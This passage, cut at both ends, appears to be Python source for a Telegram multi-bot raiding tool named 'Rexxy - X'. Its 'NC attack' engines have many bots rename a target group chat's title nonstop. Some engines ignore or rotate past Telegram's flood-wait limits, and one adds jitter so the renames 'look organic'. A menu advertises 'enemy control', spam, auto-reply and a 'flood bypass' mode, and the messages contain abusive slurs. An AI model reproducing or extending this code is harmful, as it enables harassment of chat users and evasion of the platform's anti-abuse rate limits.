    stop_event: asyncio.Event,
    name_factory,
):
    """
    𝐊ᴜᴄʜ 𝐍ᴀʜɪ 𝐁ᴏʟᴀ Rexxy- X 𝐇ʏᴘᴇʀʙʟɪᴛᴢ 𝐄ɴɢɪɴᴇ — 𝐁ᴜɪʟᴛ 𝐅ᴏʀ 𝐏ᴜʀᴇ 𝐒ᴘᴇᴇᴅ 𝐖ɪᴛʜ 𝐙ᴇʀᴏ 𝐋ᴏɴɢ 𝐏ᴀᴜsᴇs.

    𝐃ᴇsɪɢɴ :
      • 𝐂ᴏɴᴄᴜʀʀᴇɴᴄʏ = 4  — 4 𝐏ᴀʀᴇʟʟᴀʟ 𝐑ᴇɴᴀᴍᴇ 𝐓ᴀsᴋs 𝐅ɪʀɪɴɢ 𝐏ᴇʀ 𝐁ᴏᴛ 𝐒ɪᴍᴜʟᴛᴀɴᴇᴏᴜsʟʏ.
      • 𝐆ʜᴏsᴛ_𝐓ʜʀᴇsʜᴏʟᴅ = 99s — 𝐕ɪʀᴛᴜᴀʟʟʏ 𝐄ᴠᴇʀʏ 𝐑ᴇᴛʀʏ 𝐀ғᴛᴇʀ 𝐈s 𝐆ʜᴏsᴛ - 𝐒ᴋɪᴘᴘᴇᴅ.
        𝐆ʜᴏsᴛ 𝐒ᴋɪᴘ = 1–3 ᴍs 𝐌ɪᴄʀᴏ - 𝐉ɪᴛᴛᴇʀ 𝐓ʜᴇɴ 𝐈ᴍᴍᴇᴅɪᴀᴛᴇʟʏ 𝐅ɪʀᴇ 𝐀ɢᴀɪɴ, 𝐍ᴏ 𝐖ᴀɪᴛ.
      • 𝐇ᴀʀᴅ 𝐅ʟᴏᴏᴅs (>99s, 𝐍ᴇᴀʀʟʏ 𝐈ᴍᴘᴏssɪʙʟᴇ) 𝐂ᴀᴘᴘᴇᴅ 𝐓ᴏ 3s 𝐁ʏ 𝐁ᴏᴛ 𝐅ʟᴏᴏᴅ 𝐓ʀᴀᴄᴋᴇʀ.
      • 𝐄ᴀᴄʜ 𝐁ᴏᴛ 𝐑ᴜɴs 𝐈ᴛs 𝐎ᴡɴ 𝐈ɴᴅᴇᴘᴇɴᴅᴇɴᴛ 𝐖ᴏʀᴋᴇʀ; 𝐎ɴᴇ 𝐁ᴏᴛ's 𝐅ʟᴏᴏᴅ 𝐍ᴇᴠᴇʀ 𝐒ʟᴏᴡ 𝐎ᴛʜᴇʀs.
      • 𝐌ᴀɪɴ 𝐋ᴏᴏᴘ 𝐘ɪᴇʟᴅs 𝐓ᴏ 𝐄ᴠᴇɴᴛ 𝐋ᴏᴏᴘ 𝐕ɪᴀ 𝐀sʏɴᴄɪᴏ. 𝐒ʟᴇᴇᴘ (0) — 𝐍ᴇᴠᴇʀ 𝐁ʟᴏᴄᴋs.
    """
    GHOST_THRESHOLD = 99.0
    GHOST_MIN       = 0.001
    GHOST_MAX       = 0.003
    CONCURRENCY     = 3

    if not bots:
        return

    async def _fire(bot, name: str, bot_id: int, sem: asyncio.Semaphore):
        try:
            await bot.set_chat_title(chat_id, name)
        except RetryAfter as e:
            if e.retry_after <= GHOST_THRESHOLD:
                await asyncio.sleep(random.uniform(GHOST_MIN, GHOST_MAX))
            else:
                _flood_tracker.mark_flooded(bot_id, e.retry_after)
        except Exception:
            pass
        finally:
            sem.release()

    async def _bot_worker(bot):
        bot_id     = getattr(bot, "id", id(bot))
        sem        = asyncio.Semaphore(CONCURRENCY)
        fire_tasks: set = set()
        try:
            while not stop_event.is_set():
                if _flood_tracker.is_flooded(bot_id):
                    wait = _flood_tracker.remaining(bot_id)
                    if wait > 0:
                        try:
                            await asyncio.wait_for(stop_event.wait(), timeout=min(wait, 0.2))
                        except asyncio.TimeoutError:
                            pass
                    continue
                try:
                    await asyncio.wait_for(sem.acquire(), timeout=0.1)
                except asyncio.TimeoutError:
                    continue
                if stop_event.is_set():
                    sem.release()
                    break
                name = name_factory()[:255]
                t = asyncio.create_task(_fire(bot, name, bot_id, sem))
                fire_tasks.add(t)
                t.add_done_callback(fire_tasks.discard)
        finally:
            for t in list(fire_tasks):
                if not t.done():
                    t.cancel()

    workers = [asyncio.create_task(_bot_worker(bot)) for bot in bots]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        for w in workers:
            if not w.done():
                w.cancel()


async def _ghost_burn_engine(
    chat_id: int,
    bots: List[Any],
    stop_event: asyncio.Event,
    name_factory,
):
    """
    𝐆ʜᴏsᴛ 𝐁ᴜʀɴ 𝐄ɴɢɪɴᴇ — 10 𝐁ᴏᴛs 𝐀ᴄᴛɪɴɢ 𝐋ɪᴋᴇ 𝐅ʟᴏᴏᴅ 𝐃ᴏsᴇɴ'T 𝐄xɪsᴛ.
    𝐑ᴇᴛʀʏ 𝐀ғᴛᴇʀ ≤ 8s → 𝐌ɪᴄʀᴏ - 𝐉ɪᴛᴛᴇʀ 𝐎ɴʟʏ (0.05–0.4s), 𝐍ᴏᴛ 𝐅ᴜʟʟ 𝐖ᴀɪᴛ.
    𝐑ᴇᴛʀʏ 𝐀ғᴛᴇʀ > 8s → 𝐒ᴛᴀɴᴅᴀʀᴅ 𝐏ᴇʀ - 𝐁ᴏᴛ 𝐁ʏᴘᴀss, 𝐎ᴛʜᴇʀs 𝐊ᴇᴇᴘ 𝐅ᴜʟʟ 𝐒ᴘᴇᴇᴅ.
    """
    GHOST_THRESHOLD = 8.0

    if not bots:
        return

    async def _bot_worker(bot):
        bot_id = getattr(bot, "id", id(bot))
        while not stop_event.is_set():
            if _flood_tracker.is_flooded(bot_id):
                wait = _flood_tracker.remaining(bot_id)
                if wait > 0:
                    try:
                        await asyncio.wait_for(stop_event.wait(), timeout=min(wait, 0.3))
                    except asyncio.TimeoutError:
                        pass
                continue

            try:
                name = name_factory()[:255]
                await bot.set_chat_title(chat_id, name)
            except RetryAfter as e:
                if e.retry_after <= GHOST_THRESHOLD:
                    jitter = random.uniform(0.05, 0.4)
                    try:
                        await asyncio.wait_for(stop_event.wait(), timeout=jitter)
                    except asyncio.TimeoutError:
                        pass
                else:
                    _flood_tracker.mark_flooded(bot_id, e.retry_after)
                continue
            except (BadRequest, Forbidden):
                if stop_event.is_set():
                    break
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.2)
                except asyncio.TimeoutError:
                    pass
                continue
            except (TimedOut, NetworkError):
                if stop_event.is_set():
                    break
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.3)
                except asyncio.TimeoutError:
                    pass
                continue
            except Exception:
                if stop_event.is_set():
                    break
                await asyncio.sleep(0.05)
                continue

            if stop_event.is_set():
                break
            await asyncio.sleep(0)

    workers = [asyncio.create_task(_bot_worker(bot)) for bot in bots]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        for w in workers:
            if not w.done():
                w.cancel()


async def _relay_engine(
    chat_id: int,
    bots: List[Any],
    stop_event: asyncio.Event,
    name_factory,
):
    FULL_DELAY  = 0.0
    SLOW_DELAY  = 0.4
    FLOOD_LIMIT = 2

    if not bots:
        return

    pairs: List[List[Any]] = []
    for i in range(0, len(bots), 2):
        group = bots[i: i + 2]
        if group:
            pairs.append(group)

    n_pairs = len(pairs)
    active_group = [0]
    flood_hits: List[int] = [0] * n_pairs

    async def _bot_worker(bot, group_idx: int):
        bot_id = getattr(bot, "id", id(bot))
        while not stop_event.is_set():
            is_active = (group_idx == active_group[0])
            delay = FULL_DELAY if is_active else SLOW_DELAY

            if _flood_tracker.is_flooded(bot_id):
                wait = _flood_tracker.remaining(bot_id)
                if wait > 0:
                    try:
                        await asyncio.wait_for(stop_event.wait(), timeout=min(wait, 0.3))
                    except asyncio.TimeoutError:
                        pass
                continue

            try:
                name = name_factory()[:255]
                await bot.set_chat_title(chat_id, name)
                if is_active and flood_hits[group_idx] > 0:
                    flood_hits[group_idx] = max(0, flood_hits[group_idx] - 1)
            except RetryAfter as e:
                _flood_tracker.mark_flooded(bot_id, e.retry_after)
                if is_active:
                    flood_hits[group_idx] += 1
                    if flood_hits[group_idx] >= FLOOD_LIMIT:
                        active_group[0] = (active_group[0] + 1) % n_pairs
                        flood_hits[group_idx] = 0
                continue
            except (BadRequest, Forbidden, TimedOut, NetworkError):
                if stop_event.is_set():
                    break
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.2)
                except asyncio.TimeoutError:
                    pass
                continue
            except Exception:
                if stop_event.is_set():
                    break
                await asyncio.sleep(0.05)
                continue

            if stop_event.is_set():
                break

            if delay > 0:
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=delay)
                except asyncio.TimeoutError:
                    continue
                else:
                    break
            else:
                await asyncio.sleep(0)

    workers = []
    for g_idx, group in enumerate(pairs):
        for bot in group:
            workers.append(asyncio.create_task(_bot_worker(bot, g_idx)))

    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        for w in workers:
            if not w.done():
                w.cancel()


async def _adaptive_burst_engine(
    chat_id: int,
    bots: List[Any],
    stop_event: asyncio.Event,
    name_factory,
):
    MAX_GAP      = 1.2
    BACKOFF_STEP = 0.15
    RECOVERY     = 0.85

    if not bots:
        return

    adaptive_gap = [0.0]

    async def _safe_rename(bot, name: str) -> bool:
        bot_id = getattr(bot, "id", id(bot))
        if _flood_tracker.is_flooded(bot_id):
            return False
        try:
            await bot.set_chat_title(chat_id, name)
            return True
        except RetryAfter as e:
            _flood_tracker.mark_flooded(bot_id, e.retry_after)
            return False
        except (BadRequest, Forbidden):
            return True
        except (TimedOut, NetworkError):
            return False
        except Exception:
            return False

    while not stop_event.is_set():
        name = name_factory()[:255]
        tasks = [asyncio.create_task(_safe_rename(bot, name)) for bot in bots]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        flood_count = sum(1 for r in results if r is False)

        if flood_count > 0:
            adaptive_gap[0] = min(MAX_GAP, adaptive_gap[0] + BACKOFF_STEP * flood_count)
        else:
            adaptive_gap[0] = max(0.0, adaptive_gap[0] * RECOVERY)

        if stop_event.is_set():
            break

        gap = adaptive_gap[0]
        if gap > 0:
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=gap)
            except asyncio.TimeoutError:
                pass
        else:
            await asyncio.sleep(0)


_MENU_TEXT = (
"""╔═══════════════ஓ๑🕯️๑ஓ═══════════════╗
~ Rexxy - X  !! 🥀🌙 𝐎ғ 𝐓ʜᴇ 𝐔ɴᴅᴇғᴇᴛᴀʙʟᴇ
╚═══════════════ஓ๑🕯️๑ஓ═══════════════╝

ㅤㅤ      ㅤ ~ Rexxy - X !! 🥀🌙
ㅤㅤㅤㅤ 𝐃ᴇᴀᴅ 𝐒ᴏᴜʟ 𝐒ʏsᴛᴇᴍ ⚶

◎ ═════════ ❈ ══════════ ◎
                👿 𝗡𝗖 𝗔𝗧𝗧𝗔𝗖𝗞𝗦 👿
◎ ═════════ ❈ ══════════ ◎

➤ +randnc
➤ +burnc
➤ +ohyesnc
➤ +Lundnc
➤ +Bhosdanc
➤ +areynᴄ
➤ +hatnᴄ
➤+😭nc
➤ +aahnc
➤ +Horneync
➤ +purenc
➤ +stealthnc
"
➤ +tripnc ← seamless constant
➤+ultranc ← 🔥 BEST combo engine

◎ ═════════ ❈ ══════════ ◎
       🎯 𝗕𝗟𝗜𝗧𝗭 𝗡𝗖 (𝐒ᴀʙsᴇ 𝐅ᴀsᴛ) 🎯
◎ ═════════ ❈ ══════════ ◎

➤ +infernc 🔥
➤ +voidnc 🌑
➤ +stormnc⚡
➤ +bloodnc 🩸
➤ +divinenc 👑

◎ ═════════ ❈ ══════════ ◎
           ⚡Rexxy- 𝗫 𝗡𝗖 (𝟏–𝟏𝟎) ⚡
◎ ═════════ ❈ ══════════ ◎

➤ +Godx1 🔥
➤ +Godx2 ⚡
➤ +Godx3 💀
➤ +Godx4 🌊 
➤ +Godx5 👑 
➤ +Godx6 🐉
➤ +Godx7🩸
➤ +Godx8 💎
➤ +Godx9 🌑
➤ +Godx10 🔱 ← Ultimate

◎ ═════════ ❈ ══════════ ◎
              💥 𝗣𝗘𝗥𝗦𝗢𝗡𝗔𝗟 𝗡𝗖 💥
◎ ═════════ ❈ ══════════ ◎

➤ +arnavnc
➤ +kentonc
➤ +cr7nc

◎ ═════════ ❈ ══════════ ◎
           ⚔️ 𝗘𝗡𝗘𝗠𝗬 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 ⚔️
◎ ═════════ ❈ ══════════ ◎

➤ /ncdel
➤ /ncwar
➤ /stopncwar

◎ ═════════ ❈ ══════════ ◎
               💬 𝗦𝗣𝗔𝗠 - 𝗥𝗘𝗣𝗟𝗬 💬
◎ ═════════ ❈ ══════════ ◎

➤ +slide
➤ +spam
➤ /stopspam
➤ +autoreply
➤ /stopautoreply
➤ +targetreply
➤ /stoptargetreply
➤ +slidereply
➤ /stopslidereply

◎ ═════════ ❈ ══════════ ◎
            😂 𝗔𝗨𝗧𝗢 - 𝗥𝗘𝗔𝗖𝗧𝗦 😂
◎ ═════════ ❈ ══════════ ◎

➤ +autoreact
➤ +heartreact
➤ +boomreact
➤ +customreact <emoji>
➤ /stopreact

◎ ═════════ ❈ ══════════ ◎
                      🎵 𝗦𝗢𝗡𝗚𝗦 🎵
◎ ═════════ ❈ ══════════ ◎

➤ +song <name> — send MP3 from JioSaavn

◎ ═════════ ❈ ══════════ ◎
             🔇 𝗖𝗛𝗔𝗧 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 🔇
◎ ═════════ ❈ ══════════ ◎

➤ /mute
➤ /restrict
➤ /unrestrict

◎ ═════════ ❈ ══════════ ◎
                💭 𝗠𝗘𝗡𝗨 𝗦𝗘𝗧𝗨𝗣 💭
◎ ═════════ ❈ ══════════ ◎

➤ /setmenuphoto
➤ /setmenuvideo
➤ /clearmenu

◎ ═════════ ❈ ══════════ ◎
             👤 𝗨𝗦𝗘𝗥 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 👤
◎ ═════════ ❈ ══════════ ◎

➤ /setapi 
➤ /userlogin
➤ /userotp
➤ /user2fa
➤ /userlogout
➤ /userstatus

◎ ═════════ ❈ ══════════ ◎
   🤖 𝗕𝗢𝗧 ( 𝐌ᴀɴᴀɢᴇᴍᴇɴᴛ - 𝐔sᴇʀ ) 🤖
◎ ═════════ ❈ ══════════ ◎

➤ /addbot
➤ /addallbots
➤ /promotebot
➤ /promoteallbots
➤ /kickbot
➤ /kickallbots
➤ /creategc <name>

◎ ═════════ ❈ ══════════ ◎
                       🛠 𝗧𝗢𝗢𝗟𝗦 🛠
◎ ═════════ ❈ ══════════ ◎

➤ /gclist
➤ /leave
➤ /stop
➤ /bots

◎ ═════════ ❈ ══════════ ◎
      🥵 𝗙𝗟𝗢𝗢𝗗 𝗕𝗬𝗣𝗔𝗦𝗦 𝗖𝗢𝗥𝗘 🥵
◎ ═════════ ❈ ══════════ ◎

➤ /floodbypass on
➤ /floodbypass off
➤ /floodbypass status

    "𝐆ʜᴏsᴛ 𝐌ᴏᴅᴇ : 𝐅ʟᴏᴏᴅs  ≤30s 𝐒ᴋɪᴘᴘᴇᴅ ● 𝐌ᴀx 𝐖ᴀɪᴛ 3s"

╔═══════════════ஓ๑🌑๑ஓ═══════════════╗
“ 𝐓ʜᴇ 𝐕ᴏɪᴅ 𝐃ᴏᴇs𝐧’𝐭 𝐅ᴇᴀʀ ”
“ 𝐈𝐭 𝐂ᴏɴsᴜᴍᴇs ”
ㅤㅤㅤㅤㅤㅤ ⚶ 𝐍ᴏ 𝐋ɪɢʜᴛ ⚶
ㅤㅤㅤㅤㅤ ⚶ 𝐍ᴏ 𝐌ᴇʀᴄʏ ⚶
ㅤㅤㅤㅤ ⚶ 𝐎ɴʟʏ ~ Rexxy - X  !! 🥀🌙 ⚶
╚═══════════════ஓ๑🌑๑ஓ═══════════════╝"""
)

_TG_CAPTION_LIMIT = 1024

async def _send_menu(target_msg, caption: str):
    pid  = _menu_media.get("photo_id")
    vid  = _menu_media.get("video_id")
    anim = _menu_media.get("animation_id")
    doc  = _menu_media.get("document_id")

    has_media = bool(pid or vid or anim or doc)

    if has_media:
        if len(caption) <= _TG_CAPTION_LIMIT:
            cap1, cap2 = caption, None
        else:
            cap1 = caption[:_TG_CAPTION_LIMIT - 1] + "…"
            cap2 = caption[_TG_CAPTION_LIMIT - 1:]
        try:
            if pid:
                await target_msg.reply_photo(photo=pid, caption=cap1)
            elif vid:
                await target_msg.reply_video(video=vid, caption=cap1)
            elif anim:
                await target_msg.reply_animation(animation=anim, caption=cap1)
            elif doc:
                await target_msg.reply_document(document=doc, caption=cap1)
            if cap2:
                try:
                    await target_msg.reply_text(cap2)
                except Exception:
                    pass
            return
        except Exception:
            pass

    try:
        await target_msg.reply_text(caption)
    except Exception:
        pass

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat or not update.message:
        return
    known_chats.add(update.effective_chat.id)
    save_groups(known_chats)
    await _send_menu(update.message, _MENU_TEXT)


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    await _send_menu(update.message, _MENU_TEXT)


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    count = await task_controller.stop_all_for_chat(update.effective_chat.id)
    if count > 0:
        await update.message.reply_text("🥵 Rexxy - X 𝐏ᴀᴘᴀ 𝐍ᴇ 𝐇ᴀᴛᴇʀs 𝐊ɪ 𝐂ʜᴜᴅᴀɪ 𝐑ᴏᴋ 𝐃ɪ  — all tasks cancelled instantly.")
    else:
        await update.message.reply_text("Nothing running here.")


async def addsudo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or update.effective_user.id != OWNER_ID:
        return
    if not update.message:
        return
    target_id: Optional[int] = None
    if context.args:
        try:
            target_id = int(context.args[0])
        except ValueError:
            return await update.message.reply_text("Usage: /addsudo <user_id>")
    elif update.message.reply_to_message and update.message.reply_to_message.from_user:
        target_id = update.message.reply_to_message.from_user.id
    if not target_id:
        return await update.message.reply_text("Usage: /addsudo <user_id>  or reply to a user's message")
    if target_id == OWNER_ID:
        return await update.message.reply_text("You are already the owner.")
    SUDO_USERS.add(target_id)
    save_sudo()
    await update.message.reply_text(
        f"Rexxy - X 𝐁ᴀᴀᴘ 𝐍ᴇ 𝐁ʜɪᴋ 𝐌ᴇ 𝐒ᴜᴅᴏ 𝐃ᴇ 𝐃ɪʏᴀ 𝐑ɴᴅʏᴄᴇ 👿\n"
        f"User `{target_id}` can now use all bot commands.",
        parse_mode="Markdown",
    )


async def removesudo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or update.effective_user.id != OWNER_ID:
        return
    if not update.message:
        return
    target_id: Optional[int] = None
    if context.args:
        try:
            target_id = int(context.args[0])
        except ValueError:
            return await update.message.reply_text("Usage: /removesudo <user_id>")
    elif update.message.reply_to_message and update.message.reply_to_message.from_user:
        target_id = update.message.reply_to_message.from_user.id
    if not target_id:
        return await update.message.reply_text("Usage: /removesudo <user_id>  or reply to a user's message")
    if target_id == OWNER_ID:
        return await update.message.reply_text("Cannot remove the owner.")
    if target_id not in SUDO_USERS:
        return await update.message.reply_text(f"User `{target_id}` is not a sudo user.", parse_mode="Markdown")
    SUDO_USERS.discard(target_id)
    save_sudo()
    await update.message.reply_text(
        f"Rexxy - X 𝐁ᴀᴀᴘ 𝐒ᴇ 𝐆ᴀᴅᴅᴀʀɪ!!? 😠💢"
        f"User `{target_id}` can no longer use the bot.",
        parse_mode="Markdown",
    )


async def sudolist_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or update.effective_user.id != OWNER_ID:
        return
    if not update.message:
        return
    users = SUDO_USERS - {OWNER_ID}
    if not users:
        return await update.message.reply_text("No sudo users added yet.\nUse /addsudo <user_id> to grant access.")
    lines = [f"• `{uid}`" for uid in sorted(users)]
    await update.message.reply_text(
        f"👥 𝐒𝐔𝐃𝐎 𝐔𝐒𝐄𝐑𝐒 ({len(users)}):\n" + "\n".join(lines) + "\n\n/removesudo <user_id> to revoke",
        parse_mode="Markdown",
    )


async def bots_info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    count = len([b for b in all_bot_instances if b is not None])
    await update.message.reply_text(f"👑 Rexxy - X 𝐀ᴄᴛɪᴠᴇ 𝐁ᴏᴛs : {count}")


async def randnc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+randnc", "💦randnc", "/randnc"), context)
    if not base:
        return await update.message.reply_text("Usage: +randnc <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last = [""]

    def make_name():
        return _build_name(base, _last)

    async def nc_loop(stop_event: asyncio.Event):
        await _steadync_engine(chat_id, bots, stop_event, make_name, 0.0)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    _show_preview = f"{random.choice(WRAP_RIGHT)}{base}{make_suffix()}"
    await update.message.reply_text(
        f"🎲 💦𝐑𝐀𝐍𝐃𝐍𝐂 𝐀𝐂𝐓𝐈𝐕𝐄 ({len(bots)} bots)\n"
        f"Preview: {_show_preview[:80]}\n"
        f"Stop: /stop"
    )


async def burnc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+burnc", "💦burnc", "/burnc"), context)
    if not base:
        return await update.message.reply_text("Usage: +burnc <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last = [""]

    def make_name():
        sym = random.choice(BURN_SYMS)
        return f"{sym}{base}{sym}{make_suffix()}"[:255]

    async def nc_loop(stop_event: asyncio.Event):
        await _ghost_burn_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    await update.message.reply_text(
        f"👻 💦𝐁𝐔𝐑𝐍𝐂 𝐆𝐇𝐎𝐒𝐓 𝐌𝐎𝐃𝐄 ({len(bots)} bots)\n"
        f"🔥 Flood ≤8s = ghost skip · Flood >8s = bot rotates\n"
        f"Stop: /stop"
    )


async def ohyesnc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+ohyesnc", "💦ohyesnc", "/ohyesnc"), context)
    if not base:
        return await update.message.reply_text("Usage: +ohyesnc <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last = [""]

    def make_name():
        sym = random.choice(WAVE_SYMBOLS)
        return f"{sym} {base} {sym}{make_suffix()}"[:255]

    async def nc_loop(stop_event: asyncio.Event):
        await _relay_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    pairs_count = max(1, len(bots) // 2)
    await update.message.reply_text(
        f"🔄 💦𝐎𝐇𝐘𝐄𝐒𝐍𝐂 𝐑𝐄𝐋𝐀𝐘 ({len(bots)} bots · {pairs_count} pairs)\n"
        f"⚡ Pair 1 full → floods → Pair 2 takes over → cyclic\n"
        f"Stop: /stop"
    )


async def aahnc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+aahnc", "💦aahnc", "/aahnc"), context)
    if not base:
        return await update.message.reply_text("Usage: +aahnc <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last = [""]

    def make_name():
        s1 = random.choice(WAVE_SYMBOLS + BURN_SYMS)
        s2 = random.choice(WAVE_SYMBOLS + BURN_SYMS)
        return f"{s1}{base}{s2}{make_suffix()}"[:255]

    async def nc_loop(stop_event: asyncio.Event):
        await _adaptive_burst_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    await update.message.reply_text(
        f"💥 💦𝐀𝐀𝐇𝐍𝐂 𝐀𝐃𝐀𝐏𝐓𝐈𝐕𝐄 𝐁𝐔𝐑𝐒𝐓 ({len(bots)} bots)\n"
        f"🧠 Gap 0ms start · +150ms/flood · -15%/clean round\n"
        f"Stop: /stop"
    )


async def horneync_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw,
        ("+horneync", "+Horneync", "💦horneync", "💦Horneync", "/horneync", "/Horneync"),
        context)
    if not base:
        return await update.message.reply_text("Usage: +Horneync <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last = [""]

    def make_name():
        for _ in range(len(WATER_SYMS)):
            sym = random.choice(WATER_SYMS)
            candidate = f"{sym} {base} {sym}{make_suffix()}"[:255]
            if candidate != _last[0]:
                _last[0] = candidate
                return candidate
        return f"{base}{make_suffix()}"[:255]

    async def nc_loop(stop_event: asyncio.Event):
        await _hyperfire_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    preview = random.choice(WATER_SYMS)
    await update.message.reply_text(
        f"🌊 💦𝐇𝐎𝐑𝐍𝐄𝐘𝐍𝐂 𝐇𝐘𝐏𝐄𝐑𝐅𝐈𝐑𝐄 ({len(bots)} bots)\n"
        f"💧 Style: {preview} {base} {preview}{_SUFFIX.format(emoji='🌸')}\n"
        f"Stop: /stop"
    )


async def purenc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +purenc <text>
    PURE HYPERFIRE — absolutely zero delay or jitter between renames.
    All bots fire-and-forget in parallel without any sleep.
    Fastest possible NC; flood bypass is still per-bot so stream never stops.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+purenc", "💦purenc", "/purenc"), context)
    if not base:
        return await update.message.reply_text("Usage: +purenc <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last = [""]

    def make_name():
        return _build_name(base, _last)

    async def nc_loop(stop_event: asyncio.Event):
        await _hyperfire_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    await update.message.reply_text(
        f"⚡ 💦𝐏𝐔𝐑𝐄𝐍𝐂 𝐇𝐘𝐏𝐄𝐑𝐅𝐈𝐑𝐄 ({len(bots)} bots)\n"
        f"🔥 Zero jitter · fire-and-forget · absolute max speed\n"
        f"Stop: /stop"
    )


async def stealthnc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +stealthnc <text>
    STEALTH MODE — fast NC with tiny per-bot random jitter (30–120ms).
    Spreads renames across Telegram's server so they look organic, not like a burst.
    Flood rarely triggers; when it does, only that bot is paused — others keep going.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+stealthnc", "💦stealthnc", "/stealthnc"), context)
    if not base:
        return await update.message.reply_text("Usage: +stealthnc <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last = [""]

    def make_name():
        return _build_name(base, _last)

    async def nc_loop(stop_event: asyncio.Event):
        await _stealth_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    await update.message.reply_text(
        f"🥷 💦𝐒𝐓𝐄𝐀𝐋𝐓𝐇𝐍𝐂 𝐀𝐂𝐓𝐈𝐕𝐄 ({len(bots)} bots)\n"
        f"🌫️ Micro-jitter 30–120ms · flood-proof · fast & invisible\n"
        f"Stop: /stop"
    )


_LUND_SYMS = [
    "꒰꒱","꒦꒷","ꗃ","ꖰ","ꗍ","ꗆ","꙰","ꬶ","ꬷ",
    "⌇","꠸","꠹","꠺","ꦰ","ꦱ","ꦲ","꦳",
    "🍆","🔥","⚡","💥","🌋","☄️","💣","🗡️","⚔️","🌊",
    "꧃","꧄","꧅","꧆","꧇","꧈","꧉","꧊",
]

async def lundnc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+lundnc", "💦lundnc", "/lundnc", "+Lundnc", "💦Lundnc"), context)
    if not base:
        return await update.message.reply_text("Usage: +Lundnc <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last = [""]

    def make_name():
        s1 = random.choice(_LUND_SYMS)
        s2 = random.choice(_LUND_SYMS)
        suf = make_suffix()
        c = f"{s1}{base}{s2}{suf}"[:255]
        if c != _last[0]:
            _last[0] = c
        return c

    async def nc_loop(stop_event: asyncio.Event):
        await _hyperfire_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    await update.message.reply_text(
